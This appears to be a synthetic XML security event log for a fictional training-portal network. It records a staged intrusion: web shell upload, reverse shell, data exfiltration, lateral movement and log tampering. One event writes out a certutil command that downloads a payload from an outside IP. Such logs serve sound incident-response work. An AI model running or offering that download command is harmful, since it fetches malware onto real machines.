@@ -1,0 +1,93 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+  <Event>
+    <EventID>EVT-507-01</EventID>
+    <Timestamp>2026-05-07T02:14:08</Timestamp>
+    <SourceHost>training-portal.nykfil.local</SourceHost>
+    <EventType>Suspicious Login</EventType>
+    <Severity>High</Severity>
+    <User>cert_admin</User>
+    <Description>Successful login for cert_admin at 02:14 local time from IP 185.220.101.45 (Tor exit node, Romania). cert_admin has never logged in outside of business hours and has no historical access from non-Philippines IPs.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-02</EventID>
+    <Timestamp>2026-05-07T02:18:33</Timestamp>
+    <SourceHost>training-portal.nykfil.local</SourceHost>
+    <EventType>Unauthorized Access</EventType>
+    <Severity>Critical</Severity>
+    <User>cert_admin</User>
+    <Description>cert_admin accessed /api/cert/upload from the suspicious Tor session and uploaded a file named cert_renewal.php. File hash matches a known PHP web shell (Weevely variant). Subsequent requests show attempted command execution.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-03</EventID>
+    <Timestamp>2026-05-07T02:21:50</Timestamp>
+    <SourceHost>training-portal.nykfil.local</SourceHost>
+    <EventType>Malware Detected</EventType>
+    <Severity>Critical</Severity>
+    <User>www-data</User>
+    <Description>EDR flagged outbound connection from web server process (PID 8842) to 185.220.101.45:4444. Process tree shows nginx -> php-fpm -> /tmp/.cert_renewal.php -> bash. Reverse shell pattern confirmed.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-04</EventID>
+    <Timestamp>2026-05-07T03:05:12</Timestamp>
+    <SourceHost>db-primary.nykfil.local</SourceHost>
+    <EventType>Data Exfiltration</EventType>
+    <Severity>Critical</Severity>
+    <User>backup</User>
+    <Description>The "backup" service account read all rows from trainees and certifications tables (47,210 rows total). Read came from the web server IP, not the backup orchestrator. Egress firewall blocked outbound transfer to 185.220.101.45 after 1.2 GB.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-05</EventID>
+    <Timestamp>2026-05-07T03:42:00</Timestamp>
+    <SourceHost>training-portal.nykfil.local</SourceHost>
+    <EventType>Lateral Movement</EventType>
+    <Severity>High</Severity>
+    <User>www-data</User>
+    <Description>Web server initiated SSH connections to 7 internal hosts including hr-fileshare and finance-db. Authentication used a key found in /home/deploy/.ssh that should not have been on the web server. 2 of 7 connections succeeded.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-06</EventID>
+    <Timestamp>2026-05-07T04:11:47</Timestamp>
+    <SourceHost>hr-fileshare.nykfil.local</SourceHost>
+    <EventType>Brute Force</EventType>
+    <Severity>Medium</Severity>
+    <User>multiple</User>
+    <Description>SMB brute force from web server IP. 412 authentication attempts against 18 user accounts in 4 minutes. Account lockout policy triggered for 5 accounts including the IT director's account.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-07</EventID>
+    <Timestamp>2026-05-07T07:28:04</Timestamp>
+    <SourceHost>training-portal.nykfil.local</SourceHost>
+    <EventType>Authentication Failure</EventType>
+    <Severity>Medium</Severity>
+    <User>various</User>
+    <Description>Spike in failed logins on the trainee portal: 2,300 failures in 12 minutes across 89 distinct usernames. User-agent string matches the OWASP "ZAP" automated scanner. Source IP 45.142.212.61 (Russia).</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-08</EventID>
+    <Timestamp>2026-05-07T09:55:21</Timestamp>
+    <SourceHost>workstation-it-04.nykfil.local</SourceHost>
+    <EventType>Suspicious Process</EventType>
+    <Severity>High</Severity>
+    <User>r.santos</User>
+    <Description>Process certutil.exe spawned by Outlook with command line "certutil -urlcache -f http://45.142.212.61/payload.exe %TEMP%\update.exe". Classic LOLBin pattern used to download malware while bypassing application allowlists. r.santos opened an attachment from a phishing email at 09:54.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-09</EventID>
+    <Timestamp>2026-05-07T10:32:18</Timestamp>
+    <SourceHost>file-server-02.nykfil.local</SourceHost>
+    <EventType>Policy Violation</EventType>
+    <Severity>Low</Severity>
+    <User>m.delarosa</User>
+    <Description>User mounted personal USB drive (VID 0951 PID 1666 — Kingston DataTraveler) on a workstation in the restricted training-records zone. DLP rule logged the event but did not block — the workstation predates the agent rollout.</Description>
+  </Event>
+  <Event>
+    <EventID>EVT-507-10</EventID>
+    <Timestamp>2026-05-07T11:08:40</Timestamp>
+    <SourceHost>db-primary.nykfil.local</SourceHost>
+    <EventType>Log Tampering</EventType>
+    <Severity>Critical</Severity>
+    <User>root</User>
+    <Description>MySQL general_log table truncated by root from the web server IP at 03:48 (during the active attack window). Backup of binary logs from before truncation is available on the standby replica. Indicates attacker attempt to cover tracks after data exfiltration.</Description>
+  </Event>
+</Events>
